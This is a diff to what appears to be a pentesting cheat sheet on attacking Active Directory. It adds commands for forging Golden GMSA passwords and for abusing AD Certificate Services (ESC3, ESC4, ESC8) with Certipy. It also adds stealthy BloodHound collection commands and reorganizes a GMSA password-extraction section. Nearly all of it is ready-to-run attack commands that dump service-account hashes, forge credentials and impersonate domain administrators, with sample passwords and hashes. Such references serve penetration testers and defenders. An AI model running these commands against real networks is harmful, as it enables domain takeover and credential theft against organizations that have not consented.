@@ -48,6 +48,7 @@
     - [Password in AD User comment](#password-in-ad-user-comment)
     - [Reading LAPS Password](#reading-laps-password)
     - [Reading GMSA Password](#reading-gmsa-password)
+    - [Forging Golden GMSA](#forging-golden-gmsa)
     - [Pass-the-Ticket Golden Tickets](#pass-the-ticket-golden-tickets)
       - [Using Mimikatz](#using-mimikatz)
       - [Using Meterpreter](#using-meterpreter)
@@ -75,9 +76,10 @@
     - [Active Directory Certificate Services](#active-directory-certificate-services)
       - [ESC1 - Misconfigured Certificate Templates](#esc1---misconfigured-certificate-templates)
       - [ESC2 - Misconfigured Certificate Templates](#esc2---misconfigured-certificate-templates)
+      - [ESC3 - Misconfigured Enrollment Agent Templates](#esc3---misconfigured-enrollment-agent-templates)
       - [ESC4 - Access Control Vulnerabilities](#esc4---access-control-vulnerabilities)
-      * [ESC6 - EDITF_ATTRIBUTESUBJECTALTNAME2 ](#esc6---editf_attributesubjectaltname2)
-      * [ESC7 - Vulnerable Certificate Authority Access Control](#esc7---vulnerable-certificate-authority-access-control)
+      - [ESC6 - EDITF_ATTRIBUTESUBJECTALTNAME2 ](#esc6---editf_attributesubjectaltname2)
+      - [ESC7 - Vulnerable Certificate Authority Access Control](#esc7---vulnerable-certificate-authority-access-control)
       - [ESC8 - AD CS Relay Attack](#esc8---ad-cs-relay-attack)
     - [Dangerous Built-in Groups Usage](#dangerous-built-in-groups-usage)
     - [Abusing Active Directory ACLs/ACEs](#abusing-active-directory-aclsaces)
@@ -210,41 +212,44 @@ Use the correct collector
 * AzureHound for Azure Active Directory
 * SharpHound for local Active Directory
 
-use [AzureHound](https://posts.specterops.io/introducing-bloodhound-4-0-the-azure-update-9b2b26c5e350)
+* use [AzureHound](https://posts.specterops.io/introducing-bloodhound-4-0-the-azure-update-9b2b26c5e350)
+  ```powershell
+  # require: Install-Module -name Az -AllowClobber
+  # require: Install-Module -name AzureADPreview -AllowClobber
+  Connect-AzureAD
+  Connect-AzAccount
+  . .\AzureHound.ps1
+  Invoke-AzureHound
+  ```
 
-```powershell
-# require: Install-Module -name Az -AllowClobber
-# require: Install-Module -name AzureADPreview -AllowClobber
-Connect-AzureAD
-Connect-AzAccount
-. .\AzureHound.ps1
-Invoke-AzureHound
-```
+* use [BloodHound](https://github.com/BloodHoundAD/BloodHound)
+  ```powershell
+  # run the collector on the machine using SharpHound.exe
+  # https://github.com/BloodHoundAD/BloodHound/blob/master/Collectors/SharpHound.exe
+  # /usr/lib/bloodhound/resources/app/Collectors/SharpHound.exe
+  .\SharpHound.exe -c all -d active.htb -SearchForest
+  .\SharpHound.exe --EncryptZip --ZipFilename export.zip
+  .\SharpHound.exe -c all,GPOLocalGroup
+  .\SharpHound.exe -c all --LdapUsername <UserName> --LdapPassword <Password> --JSONFolder <PathToFile>
+  .\SharpHound.exe -c all -d active.htb --LdapUsername <UserName> --LdapPassword <Password> --domaincontroller 10.10.10.100
+  .\SharpHound.exe -c all,GPOLocalGroup --outputdirectory C:\Windows\Temp --randomizefilenames --prettyjson --nosavecache --encryptzip --collectallproperties --throttle 10000 --jitter 23
+  .\SharpHound.exe -c all,GPOLocalGroup --searchforest
 
-use [BloodHound](https://github.com/BloodHoundAD/BloodHound)
+  # or run the collector on the machine using Powershell
+  # https://github.com/BloodHoundAD/BloodHound/blob/master/Collectors/SharpHound.ps1
+  # /usr/lib/bloodhound/resources/app/Collectors/SharpHound.ps1
+  Invoke-BloodHound -SearchForest -CSVFolder C:\Users\Public
+  Invoke-BloodHound -CollectionMethod All  -LDAPUser <UserName> -LDAPPass <Password> -OutputDirectory <PathToFile>
 
-```powershell
-# run the collector on the machine using SharpHound.exe
-# https://github.com/BloodHoundAD/BloodHound/blob/master/Collectors/SharpHound.exe
-# /usr/lib/bloodhound/resources/app/Collectors/SharpHound.exe
-.\SharpHound.exe -c all -d active.htb -SearchForest
-.\SharpHound.exe --EncryptZip --ZipFilename export.zip
-.\SharpHound.exe -c all,GPOLocalGroup
-.\SharpHound.exe -c all --LdapUsername <UserName> --LdapPassword <Password> --JSONFolder <PathToFile>
-.\SharpHound.exe -c all -d active.htb --LdapUsername <UserName> --LdapPassword <Password> --domaincontroller 10.10.10.100
-.\SharpHound.exe -c all,GPOLocalGroup --outputdirectory C:\Windows\Temp --randomizefilenames --prettyjson --nosavecache --encryptzip --collectallproperties --throttle 10000 --jitter 23
-
-# or run the collector on the machine using Powershell
-# https://github.com/BloodHoundAD/BloodHound/blob/master/Collectors/SharpHound.ps1
-# /usr/lib/bloodhound/resources/app/Collectors/SharpHound.ps1
-Invoke-BloodHound -SearchForest -CSVFolder C:\Users\Public
-Invoke-BloodHound -CollectionMethod All  -LDAPUser <UserName> -LDAPPass <Password> -OutputDirectory <PathToFile>
-
-# or remotely via BloodHound Python
-# https://github.com/fox-it/BloodHound.py
-pip install bloodhound
-bloodhound-python -d lab.local -u rsmith -p Winter2017 -gc LAB2008DC01.lab.local -c all
-```
+  # or remotely via BloodHound Python
+  # https://github.com/fox-it/BloodHound.py
+  pip install bloodhound
+  bloodhound-python -d lab.local -u rsmith -p Winter2017 -gc LAB2008DC01.lab.local -c all
+  ```
+* Collect more data for certificates exploitation using Certipy
+  ```ps1
+  certipy find 'corp.local/john:Passw0rd@dc.corp.local' -bloodhound
+  ```
 
 Then import the zip/json files into the Neo4J database and query them.
 
@@ -264,6 +269,7 @@ You can add some custom queries like :
 * [Bloodhound-Custom-Queries from @hausec](https://github.com/hausec/Bloodhound-Custom-Queries/blob/master/customqueries.json)
 * [BloodHoundQueries from CompassSecurity](https://github.com/CompassSecurity/BloodHoundQueries/blob/master/customqueries.json)
 * [BloodHound Custom Queries from Exegol - @ShutdownRepo](https://raw.githubusercontent.com/ShutdownRepo/Exegol/master/sources/bloodhound/customqueries.json)
+* [Certipy BloodHound Custom Queries from ly4k](https://github.com/ly4k/Certipy/blob/main/customqueries.json)
 
 Replace the customqueries.json file located at `/home/username/.config/bloodhound/customqueries.json` or `C:\Users\USERNAME\AppData\Roaming\BloodHound\customqueries.json`.
 
@@ -1259,9 +1265,9 @@ lsadump::lsa /inject /name:krbtgt
 Useful when you want to have the clear text password or when you need to make stats about weak passwords.
 
 Recommended wordlists:
-- rockyou (available in Kali Linux)
-- Have I Been Pwned founds (https://hashmob.net/hashlists/info/4169-Have%20I%20been%20Pwned%20V8%20(NTLM))
-- Weakpass.com
+- [Rockyou.txt](https://weakpass.com/wordlist/90)
+- [Have I Been Pwned founds](https://hashmob.net/hashlists/info/4169-Have%20I%20been%20Pwned%20V8%20(NTLM))
+- [Weakpass.com](https://weakpass.com/)
 - Read More at [Methodology and Resources/Hash Cracking.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Hash%20Cracking.md)
 
 ```powershell
@@ -1277,7 +1283,6 @@ $ python2 maskgen.py hashcat.mask --targettime 3600 --optindex -q -o hashcat_1H.
 ```
 
 :warning: If the password is not a confidential data (challenges/ctf), you can use online "cracker" like :
-- ~~[hashes.org](https://hashes.org/check.php)~~
 - [hashmob.net](https://hashmob.net)
 - [crackstation.net](https://crackstation.net)
 - [hashes.com](https://hashes.com/en/decrypt/hash)
@@ -1385,40 +1390,7 @@ or dump the Active Directory and `grep` the content.
 ldapdomaindump -u 'DOMAIN\john' -p MyP@ssW0rd 10.10.10.10 -o ~/Documents/AD_DUMP/
 ```
 
-### Reading GMSA Password
 
-> User accounts created to be used as service accounts rarely have their password changed. Group Managed Service Accounts (GMSAs) provide a better approach (starting in the Windows 2012 timeframe). The password is managed by AD and automatically changed.
-
-#### GMSA Attributes in the Active Directory 
-* `msDS-GroupMSAMembership` (`PrincipalsAllowedToRetrieveManagedPassword`) - stores the security principals that can access the GMSA password.
-* `msds-ManagedPassword` - This attribute contains a BLOB with password information for group-managed service accounts.
-* `msDS-ManagedPasswordId` - This constructed attribute contains the key identifier for the current managed password data for a group MSA.
-* `msDS-ManagedPasswordInterval` - This attribute is used to retrieve the number of days before a managed password is automatically changed for a group MSA.
-
-
-#### Extract NT hash from the Active Directory
-
-* [GMSAPasswordReader](https://github.com/rvazarkar/GMSAPasswordReader) (C#)
-  ```ps1
-  # https://github.com/rvazarkar/GMSAPasswordReader
-  GMSAPasswordReader.exe --accountname SVC_SERVICE_ACCOUNT
-  ```
-
-* [gMSADumper (Python)](https://github.com/micahvandeusen/gMSADumper)
-   ```powershell
-  # https://github.com/micahvandeusen/gMSADumper
-  python3 gMSADumper.py -u User -p Password1 -d domain.local
-  ```
-  
-* Active Directory Powershell
-  ```ps1
-  $gmsa =  Get-ADServiceAccount -Identity 'SVC_SERVICE_ACCOUNT' -Properties 'msDS-ManagedPassword'
-  $blob = $gmsa.'msDS-ManagedPassword'
-  $mp = ConvertFrom-ADManagedPasswordBlob $blob
-  $hash1 =  ConvertTo-NTHash -Password $mp.SecureCurrentPassword
-  ```
-
-* [gMSA_Permissions_Collection.ps1](https://gist.github.com/kdejoyce/f0b8f521c426d04740148d72f5ea3f6f#file-gmsa_permissions_collection-ps1) based on Active Directory PowerShell module
 
 ### Reading LAPS Password
 
@@ -1466,7 +1438,7 @@ Get-AuthenticodeSignature 'c:\program files\LAPS\CSE\Admpwd.dll'
        foreach ($objResult in $colResults){$objComputer = $objResult.Properties; $objComputer.name|where {$objcomputer.name -ne $env:computername}|%{foreach-object {Get-AdmPwdPassword -ComputerName $_}}}
        ```
 
- - From linux:
+ - From Linux:
 
    * [pyLAPS](https://github.com/p0dalirius/pyLAPS) to **read** and **write** LAPS passwords:
        ```bash
@@ -1492,6 +1464,68 @@ Get-AuthenticodeSignature 'c:\program files\LAPS\CSE\Admpwd.dll'
       ldapsearch -x -h  -D "@" -w  -b "dc=<>,dc=<>,dc=<>" "(&(objectCategory=computer)(ms-MCS-AdmPwd=*))" ms-MCS-AdmPwd`
       ```
      
+
+### Reading GMSA Password
+
+> User accounts created to be used as service accounts rarely have their password changed. Group Managed Service Accounts (GMSAs) provide a better approach (starting in the Windows 2012 timeframe). The password is managed by AD and automatically rotated every 30 days to a randomly generated password of 256 bytes.
+
+#### GMSA Attributes in the Active Directory 
+* `msDS-GroupMSAMembership` (`PrincipalsAllowedToRetrieveManagedPassword`) - stores the security principals that can access the GMSA password.
+* `msds-ManagedPassword` - This attribute contains a BLOB with password information for group-managed service accounts.
+* `msDS-ManagedPasswordId` - This constructed attribute contains the key identifier for the current managed password data for a group MSA.
+* `msDS-ManagedPasswordInterval` - This attribute is used to retrieve the number of days before a managed password is automatically changed for a group MSA.
+
+
+#### Extract NT hash from the Active Directory
+
+* [GMSAPasswordReader](https://github.com/rvazarkar/GMSAPasswordReader) (C#)
+  ```ps1
+  # https://github.com/rvazarkar/GMSAPasswordReader
+  GMSAPasswordReader.exe --accountname SVC_SERVICE_ACCOUNT
+  ```
+
+* [gMSADumper (Python)](https://github.com/micahvandeusen/gMSADumper)
+   ```powershell
+  # https://github.com/micahvandeusen/gMSADumper
+  python3 gMSADumper.py -u User -p Password1 -d domain.local
+  ```
+  
+* Active Directory Powershell
+  ```ps1
+  $gmsa =  Get-ADServiceAccount -Identity 'SVC_SERVICE_ACCOUNT' -Properties 'msDS-ManagedPassword'
+  $blob = $gmsa.'msDS-ManagedPassword'
+  $mp = ConvertFrom-ADManagedPasswordBlob $blob
+  $hash1 =  ConvertTo-NTHash -Password $mp.SecureCurrentPassword
+  ```
+
+* [gMSA_Permissions_Collection.ps1](https://gist.github.com/kdejoyce/f0b8f521c426d04740148d72f5ea3f6f#file-gmsa_permissions_collection-ps1) based on Active Directory PowerShell module
+
+
+### Forging Golden GMSA
+
+> One notable difference between a **Golden Ticket** attack and the **Golden GMSA** attack is that they no way of rotating the KDS root key secret. Therefore, if a KDS root key is compromised, there is no way to protect the gMSAs associated with it.
+
+* Using [GoldenGMSA](https://github.com/Semperis/GoldenGMSA)
+    ```ps1
+    # Enumerate all gMSAs
+    GoldenGMSA.exe gmsainfo
+    # Query for a specific gMSA
+    GoldenGMSA.exe gmsainfo --sid S-1-5-21-1437000690-1664695696-1586295871-1112
+
+    # Dump all KDS Root Keys
+    GoldenGMSA.exe kdsinfo
+    # Dump a specific KDS Root Key
+    GoldenGMSA.exe kdsinfo --guid 46e5b8b9-ca57-01e6-e8b9-fbb267e4adeb
+
+    # Compute gMSA password
+    # --sid <gMSA SID>: SID of the gMSA (required)
+    # --kdskey <Base64-encoded blob>: Base64 encoded KDS Root Key
+    # --pwdid <Base64-encoded blob>: Base64 of msds-ManagedPasswordID attribute value
+    GoldenGMSA.exe compute --sid S-1-5-21-1437000690-1664695696-1586295871-1112 # requires privileged access to the domain
+    GoldenGMSA.exe compute --sid S-1-5-21-1437000690-1664695696-1586295871-1112 --kdskey AQAAALm45UZXyuYB[...]G2/M= # requires LDAP access
+    GoldenGMSA.exe compute --sid S-1-5-21-1437000690-1664695696-1586295871-1112 --kdskey AQAAALm45U[...]SM0R7djG2/M= --pwdid AQAAA[..]AAA # Offline mode
+    ```
+
 ### Pass-the-Ticket Golden Tickets
 
 Forging a TGT require the `krbtgt` NTLM hash
@@ -2213,11 +2247,12 @@ Exploitation:
     or
     PS> Get-ADObject -LDAPFilter '(&(objectclass=pkicertificatetemplate)(!(mspki-enrollment-flag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-ra-signature=*)))(|(pkiextendedkeyusage=1.3.6.1.4.1.311.20.2.2)(pkiextendedkeyusage=1.3.6.1.5.5.7.3.2) (pkiextendedkeyusage=1.3.6.1.5.2.3.4))(mspki-certificate-name-flag:1.2.840.113556.1.4.804:=1))' -SearchBase 'CN=Configuration,DC=lab,DC=local'
     ```
-* Use Certify or [Certi](https://github.com/eloypgz/certi) to request a Certificate and add an alternative name (user to impersonate)
+* Use Certify, [Certi](https://github.com/eloypgz/certi) or [Certipy](https://github.com/ly4k/Certipy) to request a Certificate and add an alternative name (user to impersonate)
     ```ps1
     # request certificates for the machine account by executing Certify with the "/machine" argument from an elevated command prompt.
     Certify.exe request /ca:dc.domain.local\domain-DC-CA /template:VulnTemplate /altname:domadmin
     certi.py req 'contoso.local/Anakin@dc01.contoso.local' contoso-DC01-CA -k -n --alt-name han --template UserSAN
+    certipy req 'corp.local/john:Passw0rd!@ca.corp.local' -ca 'corp-CA' -template 'ESC1' -alt 'administrator@corp.local'
     ```
 * Use OpenSSL and convert the certificate, do not enter a password
     ```ps1
@@ -2246,6 +2281,21 @@ Exploitation:
 * Request a certificate specifying the `/altname` as a domain admin like in [ESC1](#esc1---misconfigured-certificate-templates).
 
 
+#### ESC3 - Misconfigured Enrollment Agent Templates
+
+> ESC3 is when a certificate template specifies the Certificate Request Agent EKU (Enrollment Agent). This EKU can be used to request certificates on behalf of other users
+
+* Request a certificate based on the vulnerable certificate template ESC3.
+  ```ps1
+  $ certipy req 'corp.local/john:Passw0rd!@ca.corp.local' -ca 'corp-CA' -template 'ESC3'
+  [*] Saved certificate and private key to 'john.pfx'
+  ```
+* Use the Certificate Request Agent certificate (-pfx) to request a certificate on behalf of other another user 
+  ```ps1
+  $ certipy req 'corp.local/john:Passw0rd!@ca.corp.local' -ca 'corp-CA' -template 'User' -on-behalf-of 'corp\administrator' -pfx 'john.pfx'
+  ```
+
+
 #### ESC4 - Access Control Vulnerabilities
 
 > Enabling the `mspki-certificate-name-flag` flag for a template that allows for domain authentication, allow attackers to "push a misconfiguration to a template leading to ESC1 vulnerability
@@ -2265,6 +2315,17 @@ Exploitation:
   ```ps1
   python3 modifyCertTemplate.py domain.local/user -k -no-pass -template user -dc-ip 10.10.10.10 -value 0 -property mspki-Certificate-Name-Flag
   ```
+
+Using Certipy
+
+```ps1
+# overwrite the configuration to make it vulnerable to ESC1
+certipy template 'corp.local/johnpc$@ca.corp.local' -hashes :fc525c9683e8fe067095ba2ddc971889 -template 'ESC4' -save-old
+# request a certificate based on the ESC4 template, just like ESC1.
+certipy req 'corp.local/john:Passw0rd!@ca.corp.local' -ca 'corp-CA' -template 'ESC4' -alt 'administrator@corp.local'
+# restore the old configuration
+certipy template 'corp.local/johnpc$@ca.corp.local' -hashes :fc525c9683e8fe067095ba2ddc971889 -template 'ESC4' -configuration ESC4.json
+```
 
 #### ESC6 - EDITF_ATTRIBUTESUBJECTALTNAME2 
 
@@ -2287,7 +2348,7 @@ Mitigation:
 #### ESC7 - Vulnerable Certificate Authority Access Control
 
 Exploitation:
-* Detect CAs that allow low privileged users the ManageCA permission
+* Detect CAs that allow low privileged users the `ManageCA`  or `Manage Certificates` permissions
     ```ps1
     Certify.exe find /vulnerable
     ```
@@ -2387,6 +2448,10 @@ Require [Impacket PR #1101](https://github.com/SecureAuthCorp/impacket/pull/1101
     unc             -       Set custom UNC callback path for EfsRpcOpenFileRaw (Petitpotam) .
     output          -       Output path to store base64 generated crt.
     ```
+* Version 4: Certipy ESC8
+  ```ps1
+  certipy relay -ca 172.16.19.100
+  ```
 
 ### Dangerous Built-in Groups Usage
 
@@ -3520,3 +3585,4 @@ CME          10.XXX.XXX.XXX:445 HOSTNAME-01   [+] DOMAIN\COMPUTER$ 31d6cfe0d16ae
 * [The Kerberos Key List Attack: The return of the Read Only Domain Controllers - Leandro Cuozzo](https://www.secureauth.com/blog/the-kerberos-key-list-attack-the-return-of-the-read-only-domain-controllers/)
 * [AD CS: weaponizing the ESC7 attack - Kurosh Dabbagh - 26 January, 2022](https://www.blackarrow.net/adcs-weaponizing-esc7-attack/)
 * [AD CS: from ManageCA to RCE - 11 February, 2022 - Pablo Martínez, Kurosh Dabbagh](https://www.blackarrow.net/ad-cs-from-manageca-to-rce/)
+* [Introducing the Golden GMSA Attack - YUVAL GORDON - March 01, 2022](https://www.semperis.com/blog/golden-gmsa-attack/)
